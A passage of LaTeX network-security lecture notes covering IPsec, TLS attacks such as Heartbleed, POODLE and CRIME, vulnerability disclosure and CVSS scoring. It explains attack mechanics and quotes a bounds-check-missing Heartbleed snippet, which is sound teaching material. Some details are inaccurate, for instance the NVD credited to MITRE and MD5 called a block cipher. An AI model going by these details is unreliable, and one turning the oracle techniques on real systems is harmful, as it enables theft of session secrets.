+But usually not \textbf{non-repudiation} or \textbf{any services once data is received}. \medskip\\
+Secure channel are usually built as follows:
+\begin{itemize}
+	\item An authenticated key establishment protocol, during which one or both parties is authenticated and a fresh, shared secret is established.
+	\item A key derivation phase, where MAC \& bulk encryption keys are derived from shared secret.
+	\item Then further traffic protected using derived keys: MAC gives data integrity mechanism and data origin 	authentication, encryption gives confidentiality.
+	\item Optional: session re-use, fast re-keying, ...
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec25.png}
+\end{center}
+
+\subsubsection*{Typical Cryptographic Primitives}
+\begin{itemize}
+	\item Symmetric encryption algorithms (for speed);
+	\item MAC algorithms (usually built from hash functions, also fast);
+	\item Asymmetric encryption and signature algorithms, Diffie-Hellman (for entity authentication and key exchange);
+	\item (Keyed) pseudo-random functions (for key derivation);
+	\item MAC-protected sequence numbers to prevent replay attacks;
+	\item Nonces and timestamps for freshness in entity authentication exchanges.
+\end{itemize}
+
+\subsubsection*{IP Security Objectives}
+\begin{itemize}
+	\item Application level: transparent to applications and users (below transport layer);
+	\item Host Level: provide security for individual hosts;
+	\item Router Level: router or neighbor advertisements come from authorized routers, redirect message come from routers to which the initial packet was sent. A routing update is not forged.
+\end{itemize}
+
+\subsection{IPSec}
+IPSec is a set of security protocols, a general framework that allows a pair of communicating entities (IP addresses!) to choose the appropriate crypto for the communication. Its service enables connectionless integrity, data origin authentication, rejection of replayed packets, confidentiality (encryption) and limited traffic flow confidentiality. \medskip\\
+There are 2 basic mode of use:
+\begin{itemize}
+	\item \textbf{“Transport” mode}: for IPsec-aware hosts as endpoints.
+	\item \textbf{“Tunnel” mode}: for IPsec-unaware hosts, established by intermediate gateways or host OS.
+\end{itemize}
+It provides authentication and/or confidentiality services for data (\textbf{AH} and \textbf{ESP} protocols) and a flexible set of key establishment methods (IKE, \textbf{IKEv2}).
+
+\subsubsection*{IPv4 and IPv6 Header}
+\begin{minipage}{0.45\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec26a.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.45\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec26b.png}
+	\end{center}
+\end{minipage}
+
+\subsubsection{IPSec Transport Mode}
+\begin{minipage}{0.5\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec27.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.45\textwidth}
+Protection for upper-layer protocols. 
+\begin{itemize}
+	\item It covers IP datagram payload (and selected header fields); could be TCP packet, UDP, ICMP message, ...
+	\item Host-to-host (end-to-end) security: IPsec processing is performed at the endpoints of secure channel. These endpoint hosts must be IPsec-aware.
+\end{itemize}
+\end{minipage}
+
+\subsubsection{IPsec Tunnel Mode}
+	\begin{center}
+		\includegraphics[scale=0.3]{img/netsec27b.png}
+	\end{center}
+
+Protection for the entire IP datagram.	
+\begin{itemize}
+	\item The Entire datagram, plus the security fields, is treated as new payload of ‘outer’ IP datagram. The original ‘inner’ IP datagram encapsulated within ‘outer’ IP datagram. 
+	\item IPsec processing performed at security gateways on behalf of endpoint hosts.
+	\begin{itemize}
+		\item Gateway could be perimeter firewall or router.
+		\item Gateway-to-gateway rather than end-to-end security.
+		\item Hosts need not be IPsec-aware.
+	\end{itemize}
+\item Inner IP datagram not visible to intermediate routers: even original source and destination addresses are encapsulated, and so ‘hidden’.
+\end{itemize}
+
+\subsubsection*{Protocols}
+\begin{itemize}
+	\item AH: \textbf{Authentication Header} for authentication and 	integrity;
+	\item ESP: \textbf{Encapsulating Security Payload} for confidentiality and authentication.
+\end{itemize}
+
+\subsubsection{AH Protocol}
+\begin{itemize}
+	\item Provides data origin authentication and data integrity. AH authenticates whole payload and most of header. 
+	\item Prevents IP address spoofing. Source IP address is authenticated.
+	\item Creates stateful channel (use of sequence numbers).
+	\item Prevents replay of old datagrams (AH sequence number is authenticated).
+	\item Uses MAC and secret key shared between endpoints.
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec28a.png}
+\end{center}
+AH specifies a header added to IP datagrams. The fields of the header include:
+\begin{itemize}
+	\item Payload length;
+	\item SPI (Security Parameters Index): identifies which algorithms and keys are to be used for IPSec processing (more later);
+	\item Sequence number;
+	\item Authentication data (the MAC value): calculate over immutable IP header fields (so omit TTL) and payload or inner IP datagram.
+\end{itemize}
+
+\subsubsection*{Before applying AH}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec29a.png}
+\end{center}
+\subsubsection*{Transport mode and Tunnel mode AH authentication}
+\begin{minipage}{0.45\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec29b.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.45\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec29c.png}
+	\end{center}
+\end{minipage}
+
+\subsubsection{ESP Protocol}
+Provides one or both:
+\begin{itemize}
+	\item Confidentiality for payload/inner datagram; sequence
+	number not protected by encryption.
+	\item Authentication of payload/inner datagram; but not of
+	any header fields (original header or outer header).
+\end{itemize}
+Traffic-flow confidentiality in tunnel mode. Uses symmetric encryption and MACs based on secret keys shared between endpoints. \medskip\\
+ESP specifies a header and trailing fields to be added to IP datagrams. Header fields include:
+\begin{itemize}
+	\item SPI (Security Parameters Index): identifies which 	algorithms and keys are to be used for IPsec processing 	(more later).
+	\item Sequence number.
+\end{itemize}
+Trailer fields include:
+\begin{itemize}
+	\item Any padding needed for encryption algorithm (may also
+	help disguise payload length).
+	\item Padding length.
+	\item Authentication data (if any) - the MAC value.
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec28b.png}
+\end{center}
+
+\subsubsection*{ESP Encryption and Authentication (Transport and Tunnel)}
+\begin{minipage}{0.45\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec30a.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.45\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec30b.png}
+	\end{center}
+\end{minipage}
+
+\subsubsection*{Combining MAC and ENC}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec31.png}
+\end{center}
+
+\subsubsection*{IPSec Key Management}
+IPSec is a heavy consumer of symmetric keys: one key for each SA is needed. Potentially, different SAs for every combination from:
+$${ESP,AH} x {tunnel,transport} x {sender, receiver} x {protocol} x {port}$$
+Where do these SAs and keys come from? Two sources:
+\begin{itemize}
+	\item Manual keying: fine for small number of nodes and testing purposes, hopeless for reasonably sized networks of IPSec-aware hosts.
+	\item IKE: \textbf{Internet Key Exchange}, RFC 2409: algorithms and parameters negotiation, protocols have many options and parameters (=complexity).
+\end{itemize}
+IKEv2 is the latest release, which addresses problems and complexities of IKE (i.e. DoS). \\
+To exchange the keys over the network, IKE uses DH (Diffie-Hellman), applying over it signature and proof of knowledge to offer an authenticated DH.
+
+\subsubsection*{SPD and SADB Example}
+Given two hosts, A and B, and two gateways, C and D: an end-to-end encrypted communication is on place. The communication between A and B (Transport Mode) is tunneled in Tunnel Mode. This way of operating generates and requires lots of keys, so A has two important databases: the \textbf{Security Associations DB} (\textbf{SADB}) and the \textbf{Security Policies DB} (\textbf{SPD}). These two are in every node that speaks IPSec.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec32.png}
+\end{center}
+\begin{itemize}
+	\item A's SPD: when A communicates to B, no matter the protocol, the policy states that the traffic has to be authenticated using HMAC (with MD5 as block cipher);
+	\item A's SADB: the communications from A to B using the AH protocol and the SPI 12 (which refers to the policy used in the SPD, so the HMAC-MD5) use the key in the SA Record.
+\end{itemize}
+This is not only host to host, it is applied also to routers.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec32b.png}
+\end{center}
+\begin{itemize}
+	\item C's SPD: always, no matter the source of destination and the protocol, the policy is to use ESP  with 3DES, with as the tunnel destination D;
+	\item C's SADB: protocol ESP with SPI 14 (3DES) uses the key in the SA Record.
+\end{itemize}
+
+\subsubsection*{Required SA Combinations}
+Transport mode and Tunnel mode can be combined in different ways. Some typical combinations:
+\begin{enumerate}
+	\item End-to-end application of IPsec between IPsec-aware
+	hosts; one or more SAs, with one of the following
+	combinations:
+	\begin{itemize}
+		\item AH in transport;
+		\item ESP in transport;
+		\item AH followed by ESP, both transport;
+		\item Any of the above, tunnelled inside AH or ESP.
+	\end{itemize}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec33a.png}
+	\end{center}
+	\item Gateway-to-gateway only (typical configuration between two routers):
+	\begin{itemize}
+		\item No IPsec at hosts;
+		\item Simple Virtual Private Network (VPN);
+		\item Single tunnel SA supporting any of AH, ESP (conf only) or ESP (conf+auth).
+	\end{itemize}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec33b.png}
+	\end{center}
+	\item A combination of 1 and 2 above:
+	\begin{itemize}
+		\item Gateway-to-gateway tunnel as in 2 carrying host-to-host traffic as in 1;
+		\item Gives additional, flexible security on local networks (between gateways and hosts);
+		\item E.g., ESP in tunnel mode carrying AH in transport mode.
+	\end{itemize}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec33c.png}
+	\end{center}
+	\item Remote host support:
+	\begin{itemize}
+		\item Single gateway (typically firewall);
+		\item Remote host uses Internet to reach firewall, then gain access to server behind firewall;
+		\item Traffic protected in inner tunnel to server as in case 1 above;
+		\item Outer tunnel protects inner traffic over Internet.
+	\end{itemize}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec33d.png}
+	\end{center}	
+\end{enumerate}
+
+\subsubsection*{Final Notes on IPSec}
+IPSec and firewalls have problems working together: authentication of source IP addresses in AH is the issue, some firewalls change these addresses on out-bound datagrams (NAT). IPSec support for ICMP is somewhat complicated. Managing IPSec policy and deployments is tricky: getting it wrong can mean losing connectivity, e.g. by making exchanges of routing updates unreadable and can mean loss of security. There are many, many IPSec options with a rather poor documentation.
+
+\subsection*{HTTP}
+As explained in \ref{http}.
+\subsection{TLS}
+Protocol designed to secure HTTP, later became a protocol to secure any other application protocol. History:
+\begin{itemize}
+	\item SSL 1.0: Internal Netscape design, early 1994;
+	\item SSL 2.0: Published by Netscape, November 1994, several problems;
+	\item SSL 3.0: Designed by Netscape and Paul Kocher, November 1996;
+	\item TLS 1.0: Internet standard based on SSL 3.0, January 1999, not interoperable with SSL 3.0;
+	\item TLS 1.1: RFC 4346 in April 2006, explicit IV and fixing the padding procedure;
+	\item TLS 1.2: RFC 5246 in August 2008 and RFC 6176 in March 2011, adding cipher algorithms (e.g., AES). Prevents downgrading attack;
+	\item TLS 1.3: RFC 8446 in August 2018, adding cipher algorithms (e.g., ECC). Removes obsolete and insecure features.
+\end{itemize}
+TLS is a set of protocol that tunnels HTTP (HTTPS, HTTP over TLS) and uses the reserved port 443. These protocols are \textbf{Record}, \textbf{Handshake}, \textbf{Change Cipher Spec} and \textbf{Alert}.
+
+\subsubsection*{TLS Record Protocol Operation}
+Protocol that encrypts the traffic using symmetric key. The application data is fragmented into chunks, which are compressed. A MAC is added, and both the data and the MAC are encrypted and appended in the Record header.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec34a.png}
+\end{center}
+
+\subsubsection*{TLS Handshake Protocol}
+Initializes the connection, and uses the other two protocols: Change Cipher Spec to negotiate algorithm and key size (used also to resume a connection), Alert to deal with error messages.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec34b.png}
+\end{center}
+
+\subsubsection*{Set of protocols}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec34c.png}
+\end{center}
+
+\subsubsection*{Attacks}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec34d.png}
+\end{center}
+TLS does not implement padding (adding data to the beginning, middle, or end of a message prior to encryption): this means that informations may be leaked from the size of the data. \medskip\\
+A common requirement for an attack is that the attacker can sniff victim’s network traffic. Some require to visit "evil.com", the victim clicks on a link or she surfs a non-HTTPS site.
+
+\subsubsection{Heartbleed (CVE-2014-0160)}
+Heartbleed is a security bug disclosed in April 2014 in the OpenSSL cryptographic library, which is a widely used for the implementation of the Transport Layer Security (TLS) protocol.
+Heartbleed may be exploited regardless of whether the party using a vulnerable OpenSSL instance for TLS is a server or a client. It results from improper input validation (due to a missing bounds check) in the implementation of the TLS heartbeat extension, thus the bug's name derives from "heartbeat”. The vulnerability is classified as a buffer over-read, a situation where more data can be read than should be allowed. \medskip\\
+OpenSSL is an open-source implementation of the SSL and TLS protocols. The core library, written in the C programming language, implements basic cryptographic functions and provides various utility functions. The OpenSSL project was founded in 1998 to provide a free set of encryption tools for the code used on the Internet. As of 2014 two thirds of all webservers use it. \medskip\\
+The Heartbeat Extension provides a new protocol for TLS allowing the usage of keep-alive functionality without performing a renegotiation. TLS is based on reliable protocols, but there is no feature available to keep the connection alive without continuous data transfer. The Heartbeat Extension overcomes these limitations. The user can use the new HeartbeatRequest message, which has to be answered by the peer with a HeartbeartResponse immediately. \\
+The Heartbeat protocol is a new protocol running on top of the Record Layer. The protocol itself consists of two message types: \textbf{HeartbeatRequest} and \textbf{HeartbeatResponse}. A HeartbeatRequest message can arrive almost at any time during the lifetime of a connection. There must not be more than one HeartbeatRequest message in flight at a time. A HeartbeatRequest message is considered to be in flight until the corresponding HeartbeatResponse message is received, or until the retransmit timer expires.
+\begin{lstlisting}
+	struct {
+		HeartbeatMessageType type;
+		uint16 payload_length;
+		opaque payload[HeartbeatMessage.payload_length];
+		opaque padding[padding_length];
+	} HeartbeatMessage;
+\end{lstlisting}
+The total length of a HeartbeatMessage must not exceed $2^{14}$ Bytes.
+\begin{itemize}
+	\item \lstinline|type|: The message type (either \lstinline|heartbeat_request| or \lstinline|heartbeat_response|);
+	\item \lstinline|payload_length|: The length of the payload;
+	\item \lstinline|payload|: The payload consists of arbitrary content;
+	\item \lstinline|Padding|: It can be any random content and the sender of this message must use at least 16 bytes of padding.
+\end{itemize}
+When a HeartbeatRequest message is received, the receiver must send a corresponding HeartbeatResponse message carrying an exact copy of the payload of the received HeartbeatRequest. If a received HeartbeatResponse message does not contain the expected payload, the message must be discarded. If it does contain the expected payload, the retransmission timer must be stopped. \\
+As said earlier, this attack was made possible because of the improper input validation of the TLS Heartbeat extension. The vulnerability lies in the variable payload. Ideally the code must check the payload data length with the actual length of data sent in the Heartbeat request, but it isn’t checking it. So if the payload is actually shorter the length specified in the request, the server may return more data in response than what it should ideally return. This is a case of Buffer Overflow. \medskip\\
+An example of vulnerable code:
+\begin{lstlisting}
+	p = &s -> s3 -> rrec.data[0];
+	buffer = OPENSSL_malloc(1+2+payload+padding);
+	bp = buffer;
+	memcpy(bp, pl, payload);
+\end{lstlisting}
+The rrec contains all the incoming request data. The code reads the data. The first byte is to check if it’s a Heartbeat protocol and then another 2 bytes determine the length of the Heartbeat payload. Ideally the length of the payload must be equal to the \lstinline|payload_length| sent in the Heartbeat request. But as discussed, the code is not checking actual length sent in the Heartbeat request. So the code copies the amount of data requested by incoming requests to the outgoing server response and possibly more than requested in some cases.
+\begin{center}
+	\includegraphics[scale=0.2]{img/netsec35a.png}
+\end{center}
+This may leak valuable information to attackers, such as session IDs, tokens, keys, etc.
+
+
+\subsubsection{POODLE (CVE-2014-3566)}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec35b.png}
+\end{center}
+Padding adds those extra few bits which are necessary before encryption to make a meaningful block. Here we are interested to know the padding scheme PKCS\#5 as it is used in the CBC (Cipher Block Chaining) Mode.
+In PKCS\#5, the final block of plaintext is padded with N
+bytes of value N. \\
+In Cryptography, an “oracle” is a system that performs cryptographic actions by taking in certain input. Hence a “padding oracle” is a type of system that takes in encrypted data from the user, decrypts it and verifies whether the padding is correct or not. Let us now try to understand that how this attack is performed.
+
+\subsubsection*{Example}
+Consider the below URL:
+\begin{lstlisting}
+	https://www.example.com/home.asp?
+		UID=8A219A434525535FF324D4G56FC9534
+\end{lstlisting}
+Let us assume that some information is sent in this UID parameter (say username) in encrypted form using the CBC mode and PKCS \#5 standard. So the application decrypts this value and returns the results based on that value. Three Scenarios are possible:
+\begin{itemize}
+	\item Case 1) Valid cipher text - Valid and normal page;
+	\item Case 2) Invalid cipher text [with improper padding] - Invalid page [such as 404 - Not Found];
+	\item Case 3) Valid cipher text but invalid padding [error].
+\end{itemize}
+\textbf{The MAC does not include the padding, so the server does not check the integrity of the padding but only that its length is correct. The server does not check if the padding has been modified.}
+\begin{itemize}
+	\item Case 1) Say you sent the value
+	\begin{lstlisting}
+	UID=8A219A434525535FF324D4G56FC95348
+	\end{lstlisting}
+	and it decrypts to a valid user “Shreyas”. Then the application would send a normal response.
+	\item Case 2) Say you sent the value
+	\begin{lstlisting}
+	UID=998877PA434525535FF324D4G56FC95348
+	\end{lstlisting}
+	and it decrypts to “aswjkaja” (invalid user). The application might respond back with a 404 message saying no such page exists.
+	\item Case 3) Say you sent the value
+	\begin{lstlisting}
+	UID=66IXS7IA434525535FF324D4G56FC95348
+	\end{lstlisting}
+	and it decrypts to “Ravi” (valid user) but with invalid padding. The application would return some exception.
+\end{itemize}
+Errors from case 2 and 3 were different, making possible to understand if decryption failed or if padding failed; so a first fix applied in TLS 1.0 was to make the Alert protocol send the same error in both cases. However that does not solve the problem: it was still possible to differentiate between the 2 studying the timing of the response (padding error answer in 21 milliseconds circa, encryption error in 23). 
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec36.png}
+\end{center}
+%TODO descrizione difficile
+
+
+\subsubsection*{“Protocol Downgrading” Attack}
+Why do people release new versions of security protocols? Because the old version got broken! However new version must be backward-compatible, because not everybody upgrades right away. An attacker can fool someone into using the old, broken version and exploit known vulnerabilities or, similarly, fool victim into using weak crypto algorithms. Defense is hard: must authenticate version early. Many protocols had “version rollback” attacks (SSL, SSH, GSM).\medskip\\
+A solution to the chosen ciphertext attack cannot just only to make alert message and time the same in both cases, but to always perform a MAC check as if zero-length padding is applied (RFCs). Encrypt-then-MAC avoids the problem because change is detected before decryption.
+
+\subsubsection{BEAST (CVE-2011-3389)}
+Another variant of attack to RC4 CBC implementation of SSL/TLS.
+
+\subsubsection{CRIME (CVE-2012-4929)}
+The CRIME attack exploits the compression algorithm of TLS. It is an acronym that stands for Compression Ratio Info-leak Made Easy. In the HTTP requests and responses there are some parts of the plaintext that are VERY predictable. Session cookies can be found on well-defined spots:
+\begin{lstlisting}
+	GET index.html HTTP/1.1
+	Host: thebankserver.com
+	(...)
+	Cookie: secret=7xc89f+94/wa
+	(...)
+\end{lstlisting}
+The attacker tries to send data from the client in the TLS context and see how this affects the ciphertext; it uses the server as an oracle, exploiting the response to “guess” the session cookie character by character. CRIME can also be done by injection, luring the victim to visit a non-HTTPS server or directly its website.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec37.png}
+\end{center}
+CRIME exploits the way in which compression algorithms work, so with the TLS algorithm which is DEFLATE.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec37b.png}
+\end{center}
+The idea behind the attack is simple: an input, controlled by the attacker, is inserted and then a secret, and the total message is compressed. If there is no overlapping sequence between the input and the secret, the result will have a certain length; but if some pattern of the input is also present in the secret, after the compression the length will be different (usually smaller). By changing the input and measure the length it will be possible to guess the secret, because SSL/TLS doesn't hide request/response length.
+\begin{lstlisting}
+	len(compress(input + secret))
+\end{lstlisting}
+\begin{center}
+	\includegraphics[scale=0.45]{img/netsec37c.png}
+\end{center}
+\begin{center}
+	\includegraphics[scale=0.45]{img/netsec37d.png}
+\end{center}
+%TODO altre immagini, da mettere???
+
+\subsubsection{BREACH (CVE-2013-3587)}
+It is a variant of CRIME; it exploits the HTTP compression algorithm.
+
+\subsubsection{Conclusions}
+The TLS attacks use approaches that can work on other protocols:
+\begin{itemize}
+	\item Exploiting vulnerability of the underlying cryptographic algorithm implementations
+	\item Exploiting information leaked by compression algorithms
+	\item Exploiting poorly written code (i.e., missing proper input validation)
+\end{itemize}
+
+\newpage
+\section{Vulnerabilities}
+The previously seen attacks all exploited a vulnerability.
+
+\subsubsection*{Software bug}
+A bug is a problem in the execution of the software that leads to unexpected behaviour: software crashes, wrong entries are displayed/stored in a backend database, execution loops infinitely. \\
+The characteristics of a bug are:
+\begin{itemize}
+	\item Replicability (if you can't repeat it it's not a bug);
+	\item Classification: Logic/configuration/design/implementation;
+	\item Fix priority (based on the damage they can inflict);
+	\item It is not documented. If it is, it’s a feature.
+\end{itemize}
+An example of a SW bug:
+\begin{lstlisting}
+	gets(password);
+	correct_pwd=lookup(username, database);
+	if (correct_pwd!=password)
+		printf('Login failed');
+		return err;
+	else{
+		printf('login succeeded');
+		exec(context);
+	}
+	return x;
+\end{lstlisting}
+The code does not behave as intended because of the missing parentheses at the first \lstinline|if| clause. With an inverse order in the clauses, it would be a vulnerability: \lstinline|exec(context)| is always executed.
+
+\subsection*{Vulnerabilities}
+The definition from NIST SP 800-30 of a vulnerability is:
+\begin{quote}
+	A flaw or weakness in system security
+	procedures, design, implementation, or
+	internal controls that could be exercised
+	(accidentally triggered or intentionally
+	exploited) and result in a security breach or a
+	violation of the system's security policy.
+\end{quote}
+Vulnerabilities can be found at any level in an information system: \textbf{configuration}, \textbf{infrastructure}, \textbf{software}.
+\begin{itemize}
+\item \textbf{Configuration vulnerabilities}: software or system configuration does not correctly implement security policy (e.g. accept SSH root connections from any IP);
+\item \textbf{Infrastructure vulnerabilities}: design or implementation problems that directly or indirectly affect the security of a system (e.g. a sensitive database in a network’s DMZ);
+\item \textbf{Software vulnerabilities}: design or implementation of a software module can be exploited to bypass security policy (e.g. authorisation mechanism can be bypassed).
+\end{itemize}
+Thousands of vulnerabilities are discovered each year: some are publicly disclosed, others are not. 
+The main publisher of discovered vulnerabilities is the NVD (National Vulnerability Database), managed by MITRE, a non-profit organisation (Massachusetts, U.S.A.) that supports, among others, activities from:
+\begin{itemize}
+	\item Department of Homeland Security (DHS)
+	\item Department of Defense (DoD)
+	\item National Institute for Standards and Technology (NIST)
+\end{itemize}
+Moreover, it maintaines standard for vulnerability identification, the Common Vulnerabilities and Exposures (CVE). Each vulnerability has a CVE identifier. 
+
+\subsubsection*{Vulnerability discovery}
+There are activities that are performed periodically to discover vulnerabilities, like \textbf{vulnerability scanning} and \textbf{penetration testing}.
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec38.png}
+\end{center}
+Moreover there are activities performed by individuals, like ethical hackers. \\
+Vulnerabilities are widely different in nature: often implementation-dependent, may require deep understanding of SW module interaction and necessary in-depth knowledge of system design (e.g. kernel structure, memory allocation, ...).
+There are two main discovery techniques:
+\begin{itemize}
+	\item Code lookups (you need source): manual/semi-automatic search in codebase for known patterns;
+	\item Fuzzing: semi-automatic random input generation to try to crash a program;
+	\item Bonus technique: “Google hacking” (look for known vulnerable functions in google, which returns vulnerable webpages).
+\end{itemize}
+Vulnerabilities can be found either internally or externally to a company:
+\begin{itemize}
+	\item Internally: managed within the company (part of
+	Q\&A process), with a patch (fixing) prioritisation and communication to customers;
+	\item Externally: found by an external security researcher, with disclosure to vendor (payment), patching prioritisation and disclosure to public.
+\end{itemize}
+
+\subsubsection*{Vulnerability handling}
+Internal process must accept information about new vulnerabilities (internal or external sources), verify vulnerability report and, if a vulnerability exists, develop a resolution and execute post-resolution activities.
+The standard ISO 30111 regulates all of this process, following different phases: verification, resolution and release.
+\begin{itemize}
+	\item Initial investigation (verification):
+	\begin{enumerate}
+		\item The reported problem is a security vulnerability: must have repercussions over security policy;
+		\item The vulnerability affects a supported version of the software the vendor maintains (e.g. not caused by 3 rd party modules). Else, exit process;
+		\item The vulnerability is exploitable with currently known techniques. Else, exit process;
+		\item Root cause analysis: underlying causes of vulnerability and look for similar problems in the 		code;
+		\item Prioritisation: evaluate potential threat posed by the vulnerability.
+	\end{enumerate}
+	\item Resolution decision: vendor must decide how to resolve the vulnerability. There may be different decisions
+	for different types of vulnerabilities:
+	\begin{enumerate}
+		\item Configuration vulnerabilities $\rightarrow$ advisory may be enough
+		\item Code vulnerabilities $\rightarrow$ patch
+		\item Critical vulnerabilities $\rightarrow$ release a mitigation before full patch
+	\end{enumerate}
+	\item Remediation development: every resolution must be tested before being delivered to clients to minimize negative impacts caused by software change.
+	\item Release: 
+	\begin{itemize}
+		\item Web services $\rightarrow$ vendor deploys patch itself
+		\item Stand-alone product $\rightarrow$ patch release (see ISO 29147)
+	\end{itemize}
+	\item Post-release: monitor situation (e.g. patch may not be always effective) and give support to the final client.
+\end{itemize}
+
+\subsubsection*{Vulnerability disclosure}
+Vulnerabilities are information sets and the vulnerability disclosure process is about information exchange (ISO 29147).
+The image shows how the \textbf{finder}, which is the individual that finds the vulnerability, and the \textbf{vendor} should behave according to this standard.
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec38b.png}
+\end{center}
+Basically the finder have to inform the vendor (directly or through a coordinator), which has to inform other vendors and its users. \\
+There are also 2 standards for when vulnerabilities are exchanged, STIX and TAXII.
+
+\subsection*{Confidentiality of vulnerability information}
+Vulnerability information is considered sensitive and confidential by vendors because an attack that poses a threat to end users may affect the vendor’s reputation. So it is important to build secure communication channels to preserve confidentiality and integrity of information. Vulnerability advisories are typically published after patching: internal policies determine whether a vulnerability will be published or not (typically a function of vulnerability severity). \medskip\\
+Security researcher that finds vulnerability may expect economic return and credit (to mention on curriculum). So how should one communicate a vulnerability to vendor?
+\begin{itemize}
+	\item Say too little = vulnerability not reproducible and no money are obtained
+	\item Say too much = vulnerability fully known, the vendor thanks for the info and gives no money
+\end{itemize}
+There has to be an agreement between sec researchers and vendors:
+\begin{itemize}
+	\item Third party mediates (e.g. ZDI);
+	\item Bug bounty programs (e.g. Microsoft, Google) Zerodium to know the quotation;
+	\item Credit assured (e.g. Apple?)
+\end{itemize}
+Often involves development of Proof-of-Concept exploit that shows the vulnerability is exploitable.
+
+\subsubsection*{Third party mediators}
+There are several mediators on the market, that act as proxy between security researcher and vendor. They communicate vulnerability to vendor, hold vulnerability information for a certain amount of time (typically 60-90 days) and when the hold period expires they disclose the vulnerability. It is a mechanism to push vendors to patch, so they won't be legally responsible for the exploits caused by it. Some of these mediators are Secunia, ZDI, SecurityFocus, Zerodium, ... If vulnerability is known before vendor releases patch = "zero day vulnerability"
+The Google Zero Day Project is a project to report vulnerabilities, discovering also those in competitors’ software (e.g., meltdown and spectre). They aggressively release vulnerabilities informations after the deadline expires.
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec38c.png}
+\end{center}
+
+\subsection*{Vulnerability feeds}
+Vulnerabilities are disclosed by publication in the NVD and other vulnerability feeds (public and private). Private feeds release information earlier (“early advisories”, like Secuina, SecurityFocus, ZDI). Public feeds typically release weekly or monthly updates (SANS@RISK).\medskip\\
+The Open Web Application Security Project (OWASP), a worldwide non-profit charitable organization focused on improving the security of software, is a good resource for information security resources. It has compiled a top 10 of vulnerability threats, which is a good overview of most common vulnerability types with examples:
+\begin{small}
+	\begin{enumerate}
+		\item Injection
+		\item Broken Authentication
+		\item Sensitive Data Exposure
+		\item XML External Entities
+		\item Broken Access Control
+		\item Security Misconfiguration
+		\item Cross Site Scripting (XSS)
+		\item Insecure Deserialization
+		\item Using Components with Known Vulnerabilities
+		\item Insufficient Logging and Monitoring
+	\end{enumerate}
+\end{small}
+
+\subsection{Vulnerability grading}
+How severe are the security problems affecting a software configuration? Not all vulnerabilities are the same (XSS vs BoF vs SQLi vs Privilege escalation vs ...). Vulnerability counting can NOT be a measure of severity: even in a situation with plenty vulnerabilities it should be clear the general level of threat of the entire system. Moreover clients and users should be informed too: not all users are “security experts” (in many cases this score is read by people with just “IT knowledge”). \medskip\\ A scoring system should be able to measure the security issue, but also  communicate its criticality.
+
+\subsubsection*{The Common Vulnerability Scoring System (CVSS)}
+CVSS is an open framework for communicating the characteristics and severity of software vulnerabilities. The goal is to have a shared system of metrics to analyze and measure vulnerabilities:
+\begin{itemize}
+	\item Different users score the same vulnerability in the same way = \textbf{severity assessment}
+	\item Different people “read” the same vulnerability and
+	understand the same thing = \textbf{severity communication}
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec38d.png}
+\end{center}
+CVSS (v3) is based on three metric groups:
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec38e.png}
+\end{center}
+\begin{itemize}
+	\item \textbf{Exploitability metrics}: measured over the \textbf{vulnerable} component
+	\begin{itemize}
+		\item Attack Vector
+		\item Attack Complexity
+		\item User Interaction
+		\item Privileges Required
+	\end{itemize}
+	\item \textbf{Scope metric}: Security Authority of Vulnerable Component = Security Authority of Impacted Component?
+	\item \textbf{Impact metrics} (Confidentiality, Integrity, Availability): measured over the \textbf{impacted} component (so it is affected by the threat).	
+\end{itemize}
+
+\subsubsection*{Exploitability Metrics: Attack Vector}
+This metric reflects the context in which the vulnerability exploitation occurs. The more remote an attacker (or the attack) can be from the target, the greater the vulnerability score. Possible values:
+\begin{enumerate}
+	\item Network: exploitation is bound to the network stack.
+	\item Adjacent Network: attacker needs to be in same subnet.
+	\item Local: attack is not bound to network stack, but rather to I/O on system. In some cases, the attacker may be logged in locally in order to exploit the vulnerability, otherwise, she may rely on User Interaction to execute a malicious file.
+	\item Physical: attacker must be physically operating over the vulnerable component.
+\end{enumerate}
+
+\subsubsection*{Exploitability Metrics: Attack Complexity}
+This metric describes the conditions beyond the attacker’s control that must exist in order to exploit the vulnerability. Possible values:
+\begin{enumerate}
+	\item High: A successful attack depends on conditions outside the attacker's control. That is, a successful attack cannot be accomplished, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.
+	\item Low: Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable exploit success against a vulnerable target.
+\end{enumerate}
+For example, a successful attack (high complexity) may depend on an attacker overcoming any of the following conditions:
